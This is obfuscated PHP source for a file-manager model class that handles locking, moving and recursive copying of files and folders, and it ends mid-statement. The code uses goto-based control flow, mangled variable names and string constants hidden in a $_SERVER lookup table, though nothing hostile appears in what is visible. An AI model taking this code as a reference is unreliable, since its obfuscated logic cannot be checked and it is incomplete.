SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($b²ñÁ‘›ˆ‡) { goto F·¾ß¢£ôƒ; dòƒ¦‘§šä: $this->_lockEvent($b²ñÁ‘›ˆ‡, array($fÀà”Ç‘Õ¶[497], $fÀà”Ç‘Õ¶[498]), $f‡Ïè¤È­Î); $this->_lockCheckEnd($fÀà”Ç‘Õ¶[494], $b²ñÁ‘›ˆ‡); goto D« óÁ©á‹; F·¾ß¢£ôƒ: $fÀà”Ç‘Õ¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($fÀà”Ç‘Õ¶[494], $b²ñÁ‘›ˆ‡); goto F“Ÿæ»›‘ó; F“Ÿæ»›‘ó: $f‡Ïè¤È­Î = 1; $this->_lockEvent($b²ñÁ‘›ˆ‡, array($fÀà”Ç‘Õ¶[495], $fÀà”Ç‘Õ¶[496]), $f‡Ïè¤È­Î); $this->_lockParent($b²ñÁ‘›ˆ‡, array($fÀà”Ç‘Õ¶[496]), $f‡Ïè¤È­Î); goto dòƒ¦‘§šä; D« óÁ©á‹: } public function lockCopyEnd($eŒ‹Üãâ) { $cãºÉ¶Ôù =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->allowLock()) { return; } $C¹ ÜŠÔ­å = 0; $this->_lockEvent($eŒ‹Üãâ, array($cãºÉ¶Ôù[495], $cãºÉ¶Ôù[496]), $C¹ ÜŠÔ­å); $this->_lockParent($eŒ‹Üãâ, array($cãºÉ¶Ôù[496]), $C¹ ÜŠÔ­å); $this->_lockEvent($eŒ‹Üãâ, array($cãºÉ¶Ôù[497], $cãºÉ¶Ôù[498]), $C¹ ÜŠÔ­å); } public function lockWriteStart($FÀÂª—âğ“, $E²šéèÏË› = '') { goto e¤ì¾ßìºæ; b½ÜàÚ™Øù: $C¥ÒööãÙ» = 1; $this->_lockKey($C·î§„ÄÄ[499] . $FÀÂª—âğ“ . $C·î§„ÄÄ[91] . $E²šéèÏË›, $C¥ÒööãÙ»); $this->_lockEvent($FÀÂª—âğ“, array($C·î§„ÄÄ[494], $C·î§„ÄÄ[496]), $C¥ÒööãÙ»); goto eªöïá—ĞË; eªöïá—ĞË: $this->_lockParent($FÀÂª—âğ“, array($C·î§„ÄÄ[494], $C·î§„ÄÄ[496]), $C¥ÒööãÙ»); $this->_lockCheckEnd($C·î§„ÄÄ[495], $FÀÂª—âğ“); goto fÜî‹²‹İ…; e¤ì¾ßìºæ: $C·î§„ÄÄ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($C·î§„ÄÄ[495], $FÀÂª—âğ“); goto b½ÜàÚ™Øù; fÜî‹²‹İ…: } public function lockWriteEnd($AÔÀšˆ¿”Í, $aî‹âÍâÅï = '') { $A®ÏØŸ²” =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->allowLock()) { return; } $F˜Ã×Û¦¹ç = 0; $this->_lockKey($A®ÏØŸ²”[499] . $AÔÀšˆ¿”Í . $A®ÏØŸ²”[91] . $aî‹âÍâÅï, $F˜Ã×Û¦¹ç); $this->_lockEvent($AÔÀšˆ¿”Í, array($A®ÏØŸ²”[494], $A®ÏØŸ²”[496]), $F˜Ã×Û¦¹ç); $this->_lockParent($AÔÀšˆ¿”Í, array($A®ÏØŸ²”[494], $A®ÏØŸ²”[496]), $F˜Ã×Û¦¹ç); } public function lockMoveStart($AÔËã‚ÛŞ) { goto fÃ©ˆ­×¢; fÃ©ˆ­×¢: $B³¢—ãÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($B³¢—ãÎ[496], $AÔËã‚ÛŞ); goto F»ì•ñ –é; F»ì•ñ –é: $F¾°å•Ô²¬ = 1; $this->_lockKey($B³¢—ãÎ[500] . $AÔËã‚ÛŞ, $F¾°å•Ô²¬); $this->_lockEvent($AÔËã‚ÛŞ, array($B³¢—ãÎ[494], $B³¢—ãÎ[495]), $F¾°å•Ô²¬); goto f«ïã½à’÷; f«ïã½à’÷: $this->_lockParent($AÔËã‚ÛŞ, array($B³¢—ãÎ[494], $B³¢—ãÎ[496]), $F¾°å•Ô²¬); $this->_lockEvent($AÔËã‚ÛŞ, array($B³¢—ãÎ[501], $B³¢—ãÎ[497], $B³¢—ãÎ[498]), $F¾°å•Ô²¬); $this->_lockCheckEnd($B³¢—ãÎ[496], $AÔËã‚ÛŞ); goto D°Œù„ˆÒİ; D°Œù„ˆÒİ: } public function lockMoveEnd($e˜½‡¬‰ìÇ) { goto eÌ‚›Úïß…; CÌ¼èÏƒËÁ: $this->_lockEvent($e˜½‡¬‰ìÇ, array($dÀ…µ‡Ü½­[501], $dÀ…µ‡Ü½­[497], $dÀ…µ‡Ü½­[498]), $A¨Âë—Ÿä•); goto D‹§ø²; eÌ‚›Úïß…: $dÀ…µ‡Ü½­ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->allowLock()) { return; } $A¨Âë—Ÿä• = 0; goto F„´¤¨ÄåŒ; F„´¤¨ÄåŒ: $this->_lockKey($dÀ…µ‡Ü½­[500] . $e˜½‡¬‰ìÇ, $A¨Âë—Ÿä•); $this->_lockEvent($e˜½‡¬‰ìÇ, array($dÀ…µ‡Ü½­[494], $dÀ…µ‡Ü½­[495]), $A¨Âë—Ÿä•); $this->_lockParent($e˜½‡¬‰ìÇ, array($dÀ…µ‡Ü½­[494], $dÀ…µ‡Ü½­[496]), $A¨Âë—Ÿä•); goto CÌ¼èÏƒËÁ; D‹§ø²: } private function _lockCheck($cÚŒáòÕ‚”, $eå†Å°«êô) { goto aàö‘î­Ç; aàö‘î­Ç: $a›ß¤ª¸“ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eìÂ¸‰…• = $this->sourceInfo($eå†Å°«êô); $Aœ©Ößˆˆœ = $cÚŒáòÕ‚” . $a›ß¤ª¸“[91] . $eå†Å°«êô; goto dŒ ä·ƒİá; DŞ„‰ö¿ğÙ: CacheLock::setErrorMsg($a›ß¤ª¸“[153] . htmlspecialchars($eìÂ¸‰…•[$a›ß¤ª¸“[28]]) . $a›ß¤ª¸“[480] . $DšÈÖëŞ÷±); $this->_lockKey($Aœ©Ößˆˆœ, 1); $this->_lockKey($Aœ©Ößˆˆœ, 0); goto A•®¸‰µÄ; dŒ ä·ƒİá: $this->_lockTimeStart[$Aœ©Ößˆˆœ] = timeFloat(); if (!is_array($eìÂ¸‰…•)) { return; } $DšÈÖëŞ÷± = LNG($a›ß¤ª¸“[502]); goto DŞ„‰ö¿ğÙ; A•®¸‰µÄ: $dÕÃ¹‘»›Â = array_reverse($this->parentLevelArray($eìÂ¸‰…•[$a›ß¤ª¸“[463]])); foreach ($dÕÃ¹‘»›Â as $bš‰‚ª¯Ç) { $Aœ©Ößˆˆœ = $cÚŒáòÕ‚” . $a›ß¤ª¸“[503] . $bš‰‚ª¯Ç; if (CacheLock::lockGet($a›ß¤ª¸“[504] . $Aœ©Ößˆˆœ)) { $eìÂ¸‰…• = $this->sourceInfo($bš‰‚ª¯Ç); CacheLock::setErrorMsg($a›ß¤ª¸“[153] . htmlspecialchars($eìÂ¸‰…•[$a›ß¤ª¸“[28]]) . $a›ß¤ª¸“[480] . $DšÈÖëŞ÷±); $this->_lockKey($Aœ©Ößˆˆœ, 1); $this->_lockKey($Aœ©Ößˆˆœ, 0); } } goto dÏ¦¾³º¯; dÏ¦¾³º¯: } private function _lockCheckEnd($eƒ½Û¯”ÏÂ, $BÑ™ÄÓÎùâ) { goto aºôøç»Öî; e˜ˆ™§Ú‹ò: if (!isset($this->_lockTimeStart[$b¥›‹°£î])) { return; } $DË´¥ğáÉ = timeFloat() - $this->_lockTimeStart[$b¥›‹°£î]; unset($this->_lockTimeStart[$b¥›‹°£î]); goto aŒ¾òŠÄ©‚; aºôøç»Öî: $b£Ÿç£îŠâ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¥›‹°£î = $eƒ½Û¯”ÏÂ . $b£Ÿç£îŠâ[91] . $BÑ™ÄÓÎùâ; CacheLock::setErrorMsg($b£Ÿç£îŠâ[366]); goto e˜ˆ™§Ú‹ò; aŒ¾òŠÄ©‚: if ($DË´¥ğáÉ > 0.5) { unset(self::$cacheSourceInfo[$b£Ÿç£îŠâ[414] . $BÑ™ÄÓÎùâ]); } $C×Ş³í®­‹ = $this->sourceInfo($BÑ™ÄÓÎùâ); if (!$C×Ş³í®­‹) { show_json(LNG($b£Ÿç£îŠâ[100]), !1); } goto fÖ”ÎõˆÊ–; fÖ”ÎõˆÊ–: } private function _lockParent($Eí¥öì«‚ì, $Fí³Ú‘¿‚ˆ, $eèÙƒ ¨’) { if (!$this->autoLockSet) { return; } $d•ƒ­¿˜ = $this->sourceInfo($Eí¥öì«‚ì); if (!is_array($d•ƒ­¿˜)) { return; } $Bõ„¦éŸ = array_reverse($this->parentLevelArray($d•ƒ­¿˜[$_SERVER[ºÖÙÂŒäÉê‡][463]])); foreach ($Bõ„¦éŸ as $Dô¿ğì¤ô) { $this->_lockEvent($Dô¿ğì¤ô, $Fí³Ú‘¿‚ˆ, $eèÙƒ ¨’); } } private function _lockEvent($bç™áŸê Š, $a’ÆëÌ¿İ, $fÅëÀ¦ƒ¥è) { $Câ©Ã¼½µ„ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->autoLockSet) { return; } foreach ($a’ÆëÌ¿İ as $c‚œ±ºßâ¨) { $e¹×á§ã« = $c‚œ±ºßâ¨ . $Câ©Ã¼½µ„[91] . $bç™áŸê Š; if ($fÅëÀ¦ƒ¥è && CacheLock::lockGet($Câ©Ã¼½µ„[504] . $e¹×á§ã«)) { continue; } $this->_lockKey($e¹×á§ã«, $fÅëÀ¦ƒ¥è); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($fæÇà°•Âì, $fóŸÁ´£™ë = 1) { $CßÎÄßÚ¸ë = $_SERVER[ºÖÙÂŒäÉê‡][504] . md5($fæÇà°•Âì); if ($fóŸÁ´£™ë) { if (isset(self::$_lockItemArr[$CßÎÄßÚ¸ë])) { return; } self::$_lockItemArr[$CßÎÄßÚ¸ë] = 1; CacheLock::lock($CßÎÄßÚ¸ë, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$CßÎÄßÚ¸ë])) { return; } unset(self::$_lockItemArr[$CßÎÄßÚ¸ë]); CacheLock::unlock($CßÎÄßÚ¸ë); } } public function isParentOf($bÉÓµ£âğ–, $E„³İİÌí±) { goto cÁ¦”¦õ; aåÉ×­‰Î: return $E©¯ŒêŒÙÃ; goto a¢¡ÆšÆ´ù; cÁ¦”¦õ: $eêäîÇÌÜ† =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eà…ÖÏÄ = $this->sourceInfo($bÉÓµ£âğ–); $AÂ´‹Ìˆøâ = $this->sourceInfo($E„³İİÌí±); goto dœ§ÁÃ“ëÖ; dœ§ÁÃ“ëÖ: $E‹—ñ¤‘±˜ = $Eà…ÖÏÄ[$eêäîÇÌÜ†[463]] . $Eà…ÖÏÄ[$eêäîÇÌÜ†[374]] . $eêäîÇÌÜ†[47]; $EÈôƒ…éò = $AÂ´‹Ìˆøâ[$eêäîÇÌÜ†[463]] . $AÂ´‹Ìˆøâ[$eêäîÇÌÜ†[374]] . $eêäîÇÌÜ†[47]; $E©¯ŒêŒÙÃ = strpos($EÈôƒ…éò, $E‹—ñ¤‘±˜) === 0; goto aåÉ×­‰Î; a¢¡ÆšÆ´ù: } private $targetIsDelete = 0; public function copy($AÁğ‘ÒÕ”ô, $eè–ÍÖ¦†œ, $aÜ¸íêÚÏ³ = REPEAT_REPLACE, $C¬¨Šó’ÄÊ = '') { goto aìèàõ ÖÊ; aìèàõ ÖÊ: $BÆ»ª°àù =& $_SERVER[ºÖÙÂŒäÉê‡]; $CÚ¿éŒõèÇ = $this->sourceInfo($AÁğ‘ÒÕ”ô); $eèÌ¬ÆÆ‹ = $this->sourceInfo($eè–ÍÖ¦†œ); goto f»‹ó¾¥‰; f»‹ó¾¥‰: if (!$CÚ¿éŒõèÇ || !$eèÌ¬ÆÆ‹ || $eèÌ¬ÆÆ‹[$BÆ»ª°àù[375]] != $BÆ»ª°àù[83]) { return !1; } if ($this->isParentOf($AÁğ‘ÒÕ”ô, $eè–ÍÖ¦†œ)) { return !1; } $F»‚›Ãğ¯Ö = $C¬¨Šó’ÄÊ ? $C¬¨Šó’ÄÊ : $CÚ¿éŒõèÇ[$BÆ»ª°àù[28]]; goto BÙö§ªåÙ“; c·÷­àÖ…‡: $this->targetIsDelete = intval($CÚ¿éŒõèÇ[$BÆ»ª°àù[401]]); $aÕ´Ó–ùŠŒ = $this->fileNameExistCache($eè–ÍÖ¦†œ, $CÚ¿éŒõèÇ[$BÆ»ª°àù[28]]); $aÌéÖÀÇšâ = $this->_copy($AÁğ‘ÒÕ”ô, $eè–ÍÖ¦†œ, $aÜ¸íêÚÏ³, $Aëù£‘ÜÃ, !0, $C¬¨Šó’ÄÊ); goto D¥­”ƒÑÔ; cŒ´‘’ŠÀ¿: $this->updateModifyTime($eè–ÍÖ¦†œ); return $aÌéÖÀÇšâ; goto a¬–†âáæ¶; Aç‘Ãµğö: $this->saveAll($Aëù£‘ÜÃ[$BÆ»ª°àù[507]]); Model($BÆ»ª°àù[163])->linkAdd($Aëù£‘ÜÃ[$BÆ»ª°àù[505]]); $this->folderSizeReset($eè–ÍÖ¦†œ); goto cŒ´‘’ŠÀ¿; D¥­”ƒÑÔ: $this->_childrenListClear(); $this->lockCopyEnd($AÁğ‘ÒÕ”ô); $this->lockWriteEnd($eè–ÍÖ¦†œ, $F»‚›Ãğ¯Ö); goto C¤‡„Ş¯Èæ; C¤‡„Ş¯Èæ: if ($CÚ¿éŒõèÇ[$BÆ»ª°àù[375]] == $BÆ»ª°àù[83] && $aÕ´Ó–ùŠŒ == $aÌéÖÀÇšâ) { $this->folderSizeResetChildren($aÕ´Ó–ùŠŒ); } Model($BÆ»ª°àù[508])->addAll($Aëù£‘ÜÃ[$BÆ»ª°àù[506]], array(), !0); if ($aÕ´Ó–ùŠŒ != $aÌéÖÀÇšâ || $CÚ¿éŒõèÇ[$BÆ»ª°àù[375]] == $BÆ»ª°àù[83]) { Model($BÆ»ª°àù[509])->eventCopy($aÌéÖÀÇšâ); } goto Aç‘Ãµğö; BÙö§ªåÙ“: $this->lockCopyStart($AÁğ‘ÒÕ”ô); $this->lockWriteStart($eè–ÍÖ¦†œ, $F»‚›Ãğ¯Ö); $Aëù£‘ÜÃ = array($BÆ»ª°àù[505] => array(), $BÆ»ª°àù[506] => array(), $BÆ»ª°àù[507] => array()); goto c·÷­àÖ…‡; a¬–†âáæ¶: } private function _copy($B†¨ã’ëÔ·, $b¨ñ¡İÜã, $C×ì¿ï½Ó…, &$aŞ¡‚æ‡‰», $c–ÂÓØŠê, $A®ÊŒğ§º› = '') { goto Eª²ôš“»„; EƒïÜ¦ÎË: $f¾Äçµƒ‡ = $A®ÊŒğ§º› ? $A®ÊŒğ§º› : $aßª›‹«ã´[$FªßÒğ™šÒ[28]]; $C«Çí©¸ò = $this->fileNameExistCache($b¨ñ¡İÜã, $f¾Äçµƒ‡); if ($c–ÂÓØŠê) { $this->_childrenAllMake($B†¨ã’ëÔ·); if ($b¾»”¢¬ªˆ && $C«Çí©¸ò) { $this->_childrenAllMake($C«Çí©¸ò); } } goto DñÑØĞ‰µ; E²Œ›ñŠ: return $BÔŠäéŒÙ; goto b»êƒë´¸—; DñÑØĞ‰µ: if (!$C«Çí©¸ò) { return $this->_copyCreate($B†¨ã’ëÔ·, $b¨ñ¡İÜã, $f¾Äçµƒ‡, $aŞ¡‚æ‡‰»); } $BÔŠäéŒÙ = $C«Çí©¸ò; if ($b¾»”¢¬ªˆ) { if ($C×ì¿ï½Ó… == REPEAT_RENAME_FOLDER) { $f¾Äçµƒ‡ = $this->fileNameAutoCache($b¨ñ¡İÜã, $f¾Äçµƒ‡, $C×ì¿ï½Ó…, $b¾»”¢¬ªˆ); $BÔŠäéŒÙ = $this->_copyCreate($B†¨ã’ëÔ·, $b¨ñ¡İÜã, $f¾Äçµƒ‡, $aŞ¡‚æ‡‰»); } else { $c‘Å±Ş¡©“ = $this->_childrenList($B†¨ã’ëÔ·); foreach ($c‘Å±Ş¡©“ as $Cœ¶æø¸) { $this->_copy($Cœ¶æø¸[$FªßÒğ™šÒ[374]], $C«Çí©¸ò, $C×ì¿ï½Ó…, $aŞ¡‚æ‡‰», !1); } } } else { if ($C×ì¿ï½Ó… == REPEAT_RENAME || $C×ì¿ï½Ó… == REPEAT_RENAME_FOLDER) { $f¾Äçµƒ‡ = $this->fileNameAutoCache($b¨ñ¡İÜã, $f¾Äçµƒ‡, $C×ì¿ï½Ó…, $b¾»”¢¬ªˆ); $BÔŠäéŒÙ = $this->_copyCreate($B†¨ã’ëÔ·, $b¨ñ¡İÜã, $f¾Äçµƒ‡, $aŞ¡‚æ‡‰»); } else { if ($C×ì¿ï½Ó… == REPEAT_REPLACE) { $eåÅ“¦Æî® = $this->sourceInfoCache($C«Çí©¸ò); $F–™äí‰âŸ = $this->fileHistory($eåÅ“¦Æî®, $aßª›‹«ã´[$FªßÒğ™šÒ[423]], $aßª›‹«ã´[$FªßÒğ™šÒ[77]]); if ($F–™äí‰âŸ) { $aŞ¡‚æ‡‰»[$FªßÒğ™šÒ[505]][] = $aßª›‹«ã´[$FªßÒğ™šÒ[423]]; } } else { if ($C×ì¿ï½Ó… == REPEAT_SKIP) { } } } Hook::trigger($FªßÒğ™šÒ[510], array($FªßÒğ™šÒ[511], $aßª›‹«ã´, 0)); } goto E²Œ›ñŠ; Eª²ôš“»„: $FªßÒğ™šÒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aßª›‹«ã´ = $this->sourceInfoCache($B†¨ã’ëÔ·); $b¾»”¢¬ªˆ = $aßª›‹«ã´[$FªßÒğ™šÒ[375]] == $FªßÒğ™šÒ[83]; goto EƒïÜ¦ÎË; b»êƒë´¸—: } private function _copyCreate($cÀ¶ŠÏµ‚Ş, $eİå”†¨, $a“Œß®ÆšÌ, &$B¤î×Ô¦‘˜) { goto CÀ®ÕĞ¦ˆ; e¯›ğ¬»Á: $this->addAll($e„¯³’Ñ¿, array(), !1); $f÷§ÔæÆÒÕ = $this->where(array($bÉÎÎÃíÍ[465] => $b‹à‚ÛÒŠù))->select(); $fáößˆÌßó = $this->_childrenMakeRelation($eÍÂÚÁÌ¿Ø, $f÷§ÔæÆÒÕ); goto d®¤é–õãÕ; d®¤é–õãÕ: $fáößˆÌßó[$cÀ¶ŠÏµ‚Ş] = $b‹à‚ÛÒŠù; $AŞÔ‘•áé = array(); $B³…Î°„çˆ = array(); goto BÚ¢ÙÊÍÄÛ; c ¥éìäÖÙ: $this->chunkEventSet($bÉÎÎÃíÍ[519], array($bÉÎÎÃíÍ[520], $aËŠÓİÇ‰Ÿ, $d­“§ÄÖš)); $this->saveAll($B³…Î°„çˆ); return $b‹à‚ÛÒŠù; goto eêÆë¶×š™; CÀ®ÕĞ¦ˆ: $bÉÎÎÃíÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fº·¬µ¬º = $this->sourceInfoCache($cÀ¶ŠÏµ‚Ş); $AŞ“Ëñ„£ = $this->sourceInfoCache($eİå”†¨); goto CÙÒ…ãŞ²Š; Cğ„¼¹Âê: $d½À’Ë»ÊŒ = $this->sourceInfo($b‹à‚ÛÒŠù); foreach ($eÍÂÚÁÌ¿Ø as $DáÖ¢°‘‚œ) { $E£Ş¡ŸßÍØ = $this->_makeItemData($DáÖ¢°‘‚œ, $d½À’Ë»ÊŒ, $DáÖ¢°‘‚œ[$bÉÎÎÃíÍ[28]]); $E£Ş¡ŸßÍØ[$bÉÎÎÃíÍ[463]] = $DáÖ¢°‘‚œ[$bÉÎÎÃíÍ[463]]; $e„¯³’Ñ¿[] = $E£Ş¡ŸßÍØ; } $this->chunkEventSet($bÉÎÎÃíÍ[515], array($bÉÎÎÃíÍ[516], $aËŠÓİÇ‰Ÿ, $d­“§ÄÖš)); goto e¯›ğ¬»Á; BÚ¢ÙÊÍÄÛ: foreach ($f÷§ÔæÆÒÕ as $DáÖ¢°‘‚œ) { $e¢²‰ÃÄ®… = $DáÖ¢°‘‚œ[$bÉÎÎÃíÍ[374]]; $C¿›±Šô = $this->_childrenMatch($fáößˆÌßó, $DáÖ¢°‘‚œ, $d½À’Ë»ÊŒ); $AŞÔ‘•áé[] = array($bÉÎÎÃíÍ[374], $e¢²‰ÃÄ®…, $bÉÎÎÃíÍ[465], $C¿›±Šô[$bÉÎÎÃíÍ[465]]); $B³…Î°„çˆ[] = array($bÉÎÎÃíÍ[374], $e¢²‰ÃÄ®…, $bÉÎÎÃíÍ[463], $C¿›±Šô[$bÉÎÎÃíÍ[463]]); $this->_copyApplyMeta($DáÖ¢°‘‚œ, $B¤î×Ô¦‘˜); if ($DáÖ¢°‘‚œ[$bÉÎÎÃíÍ[375]] != $bÉÎÎÃíÍ[83]) { $B¤î×Ô¦‘˜[$bÉÎÎÃíÍ[505]][] = $DáÖ¢°‘‚œ[$bÉÎÎÃíÍ[423]]; } } $this->chunkEventSet($bÉÎÎÃíÍ[517], array($bÉÎÎÃíÍ[518], $aËŠÓİÇ‰Ÿ, $d­“§ÄÖš)); $this->saveAll($AŞÔ‘•áé); goto c ¥éìäÖÙ; e„±†æËš¡: if ($Fº·¬µ¬º[$bÉÎÎÃíÍ[375]] != $bÉÎÎÃíÍ[83]) { $B¤î×Ô¦‘˜[$bÉÎÎÃíÍ[505]][] = $Fº·¬µ¬º[$bÉÎÎÃíÍ[423]]; return $b‹à‚ÛÒŠù; } $eÍÂÚÁÌ¿Ø = array(); $e„¯³’Ñ¿ = array(); goto B·«ò÷ÓÑ; B·«ò÷ÓÑ: $this->_childrenListAll($cÀ¶ŠÏµ‚Ş, $eÍÂÚÁÌ¿Ø); $d­“§ÄÖš = count($eÍÂÚÁÌ¿Ø); if ($d­“§ÄÖš == 0) { return $b‹à‚ÛÒŠù; } goto Cğ„¼¹Âê; CÙÒ…ãŞ²Š: $aËŠÓİÇ‰Ÿ = $this->_makeItemData($Fº·¬µ¬º, $AŞ“Ëñ„£, $a“Œß®ÆšÌ); Hook::trigger($bÉÎÎÃíÍ[512], $aËŠÓİÇ‰Ÿ); Hook::trigger($bÉÎÎÃíÍ[513], array($bÉÎÎÃíÍ[514], $aËŠÓİÇ‰Ÿ, 0)); goto fÓÀÂÌÅ±ğ; fÓÀÂÌÅ±ğ: $b‹à‚ÛÒŠù = $this->add($aËŠÓİÇ‰Ÿ); $FÍâòá‘Î = array($bÉÎÎÃíÍ[374] => $b‹à‚ÛÒŠù, $bÉÎÎÃíÍ[28] => $a“Œß®ÆšÌ); $this->_copyApplyMeta($FÍâòá‘Î, $B¤î×Ô¦‘˜); goto e„±†æËš¡; eêÆë¶×š™: } private function _childrenMakeRelation($c¼¾İÊßÔø, $bƒÚÜõò¦ö) { $bìŸ‰©Ê„Œ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¦éÙ¹í = array(); $bÇÄ‘…œŸ = array(); foreach ($c¼¾İÊßÔø as $B»ÛÊÜÁÉ§) { $e™……¯ÀÇ¢ = $B»ÛÊÜÁÉ§[$bìŸ‰©Ê„Œ[28]] . $bìŸ‰©Ê„Œ[8] . $B»ÛÊÜÁÉ§[$bìŸ‰©Ê„Œ[463]]; $D¦éÙ¹í[$e™……¯ÀÇ¢] = $B»ÛÊÜÁÉ§[$bìŸ‰©Ê„Œ[374]]; } foreach ($bƒÚÜõò¦ö as $B»ÛÊÜÁÉ§) { $e™……¯ÀÇ¢ = $B»ÛÊÜÁÉ§[$bìŸ‰©Ê„Œ[28]] . $bìŸ‰©Ê„Œ[8] . $B»ÛÊÜÁÉ§[$bìŸ‰©Ê„Œ[463]]; $FãË‘ ç÷ = $D¦éÙ¹í[$e™……¯ÀÇ¢]; $bÇÄ‘…œŸ[$FãË‘ ç÷] = $B»ÛÊÜÁÉ§[$bìŸ‰©Ê„Œ[374]]; } return $bÇÄ‘…œŸ; } private function _childrenMatch($a‚ÚÜ¸¶Ó‡, $b¬Şò„¥áŒ, $F‡É¢à‡º°) { goto a ª°âŠÍ¾; Fçî¸›İˆ…: foreach ($Eˆ«†Œ¼‡… as $d¬Œµá×Çè) { if (isset($a‚ÚÜ¸¶Ó‡[$d¬Œµá×Çè])) { $Fø¾Ëˆ˜Ô .= $a‚ÚÜ¸¶Ó‡[$d¬Œµá×Çè] . $Cïá™¹óñ[521]; } } $Fø¾Ëˆ˜Ô = rtrim($Fø¾Ëˆ˜Ô, $Cïá™¹óñ[47]) . $Cïá™¹óñ[47]; $cÕÖ†Âöº× = $this->parentLevelArray($Fø¾Ëˆ˜Ô); goto B’¹Ö‰Îïõ; a ª°âŠÍ¾: $Cïá™¹óñ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fø¾Ëˆ˜Ô = $F‡É¢à‡º°[$Cïá™¹óñ[463]]; $Eˆ«†Œ¼‡… = $this->parentLevelArray($b¬Şò„¥áŒ[$Cïá™¹óñ[463]]); goto Fçî¸›İˆ…; B’¹Ö‰Îïõ: $A¿Å‚ö¿ß² = $cÕÖ†Âöº×[count($cÕÖ†Âöº×) - 1]; return array($Cïá™¹óñ[465] => $A¿Å‚ö¿ß², $Cïá™¹óñ[463] => $Fø¾Ëˆ˜Ô); goto BÉà„‡¤²; BÉà„‡¤²: } private function _makeItemData($Báœà“ñ³’, $E±©‘àŸ¿Â, $a’ÅŸè–†‚) { $D–‡½ÂìŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÈ¬¨ÀöÑË = array($D–‡½ÂìŒ[522] => $Báœà“ñ³’[$D–‡½ÂìŒ[375]], $D–‡½ÂìŒ[391] => $a’ÅŸè–†‚, $D–‡½ÂìŒ[523] => $Báœà“ñ³’[$D–‡½ÂìŒ[377]], $D–‡½ÂìŒ[424] => $Báœà“ñ³’[$D–‡½ÂìŒ[423]], $D–‡½ÂìŒ[524] => $Báœà“ñ³’[$D–‡½ÂìŒ[77]], $D–‡½ÂìŒ[525] => $E±©‘àŸ¿Â[$D–‡½ÂìŒ[376]], $D–‡½ÂìŒ[526] => $E±©‘àŸ¿Â[$D–‡½ÂìŒ[460]], $D–‡½ÂìŒ[527] => USER_ID, $D–‡½ÂìŒ[528] => USER_ID, $D–‡½ÂìŒ[373] => $E±©‘àŸ¿Â[$D–‡½ÂìŒ[374]], $D–‡½ÂìŒ[529] => $E±©‘àŸ¿Â[$D–‡½ÂìŒ[463]] . $E±©‘àŸ¿Â[$D–‡½ÂìŒ[374]] . $D–‡½ÂìŒ[47], $D–‡½ÂìŒ[400] => 0, $D–‡½ÂìŒ[530] => $D–‡½ÂìŒ[33]); return $FÈ¬¨ÀöÑË; } private function _copyApplyMeta($CºêÒ¶“¿™, &$dËèŞŠó…) { $Aò„¹Èêœè =& $_SERVER[ºÖÙÂŒäÉê‡]; $fŒÍˆ’” = $CºêÒ¶“¿™[$Aò„¹Èêœè[374]]; $fá‡Îå© = $CºêÒ¶“¿™[$Aò„¹Èêœè[28]]; if (!isset($CºêÒ¶“¿™[$Aò„¹Èêœè[531]]) || !$CºêÒ¶“¿™[$Aò„¹Èêœè[531]] || $CºêÒ¶“¿™[$Aò„¹Èêœè[531]] == $Aò„¹Èêœè[472]) { $dËèŞŠó…[$Aò„¹Èêœè[507]][] = array($Aò„¹Èêœè[374], $fŒÍˆ’”, $Aò„¹Èêœè[531], short_id($fŒÍˆ’”)); } if (Input::check($fá‡Îå©, $Aò„¹Èêœè[532])) { $dËèŞŠó…[$Aò„¹Èêœè[506]][] = array($Aò„¹Èêœè[374] => $fŒÍˆ’”, $Aò„¹Èêœè[89] => $Aò„¹Èêœè[420], $Aò„¹Èêœè[364] => str_replace($Aò„¹Èêœè[50], $Aò„¹Èêœè[33], Pinyin::encode($fá‡Îå©))); $dËèŞŠó…[$Aò„¹Èêœè[506]][] = array($Aò„¹Èêœè[374] => $fŒÍˆ’”, $Aò„¹Èêœè[89] => $Aò„¹Èêœè[419], $Aò„¹Èêœè[364] => Pinyin::encode($fá‡Îå©, $Aò„¹Èêœè[533])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($eÊ¶†èÔ¥¡) { goto CƒƒíÕ‰Ú¡; CƒƒíÕ‰Ú¡: $fÅß¦¬•‡å =& $_SERVER[ºÖÙÂŒäÉê‡]; $FºÎÃ‚ğ‚È = $this->sourceInfo($eÊ¶†èÔ¥¡); $eø÷öŸ ¼š = $fÅß¦¬•‡å[534]; goto BˆËë‚ƒì¡; BˆËë‚ƒì¡: $bö¢ìµ» = array($fÅß¦¬•‡å[463] => array($fÅß¦¬•‡å[487], $FºÎÃ‚ğ‚È[$fÅß¦¬•‡å[463]] . $eÊ¶†èÔ¥¡ . $fÅß¦¬•‡å[488]), $fÅß¦¬•‡å[401] => $this->targetIsDelete); $C©¬íÒÍò = $this->field($eø÷öŸ ¼š)->where($bö¢ìµ»)->select(); if (!$C©¬íÒÍò) { return; } goto EÚ”»¿ËĞ¸; EÚ”»¿ËĞ¸: $C©¬íÒÍò = array_to_keyvalue($C©¬íÒÍò, $fÅß¦¬•‡å[374]); foreach ($C©¬íÒÍò as $AóæëÛÒóã) { $a…¦‰§†¬ù = $AóæëÛÒóã[$fÅß¦¬•‡å[465]]; $eÊ¶†èÔ¥¡ = $AóæëÛÒóã[$fÅß¦¬•‡å[374]]; if (!isset($this->_childrenListCache[$eÊ¶†èÔ¥¡]) && 